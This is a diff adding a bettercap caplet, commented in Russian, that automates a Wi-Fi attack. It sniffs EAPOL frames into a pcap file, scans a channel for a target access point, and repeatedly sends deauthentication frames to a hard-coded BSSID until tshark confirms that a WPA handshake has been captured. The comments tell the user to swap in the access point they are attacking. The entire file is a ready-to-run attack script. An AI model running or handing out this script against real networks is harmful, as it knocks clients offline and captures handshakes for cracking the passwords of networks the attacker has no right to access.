@@ -1,0 +1,18 @@
+# Настройка и запуск сниффера
+set net.sniff.verbose true
+set net.sniff.filter ether proto 0x888e
+set net.sniff.output /home/kali/usb/RPi/HandSHK_Bettercap.pcap
+net.sniff on
+ 
+# Настройка и запуск анализа беспроводных сетей; канал и BSSID замените на свои значения
+wifi.recon.channel 11
+wifi.recon on
+sleep 20
+wifi.recon 1c:3b:f3:a2:db:ef
+ 
+# Выполнение атаки деаутентификация, сон на 60 секунд, проверка, было ли захвачено рукопожатие, если да – то выход из bettercap. Обратите внимание, что если вы поменяли имя файла, куда сохраняется рукопожатие, то вам также нужно поменять его и здесь - /home/kali/usb/RPi/HandSHK_Bettercap.pcap, а также нужно заменить BSSID на атакуемую вами ТД
+set ticker.commands wifi.deauth 50:46:5d:6e:8c:20; sleep 60; !'if [ "`tshark -r /home/kali/usb/RPi/HandSHK_Bettercap.pcap -R 'eapol' -2 2>/dev/null`" ]; then echo "Рукопожатие захвачено, завершаем работу программы."; sleep 1; pkill -1 bettercap; else echo "Рукопожатие ещё не захвачено"; fi;'
+# Период выполнения цикла – здесь установлена всего одна секунда, поскольку в предыдущем наборе команд имеется sleep 60;, которая устанавливает сон на 60 секунд:
+set ticker.period 1
+# Запуск цикличного выполнения команд
+ticker on
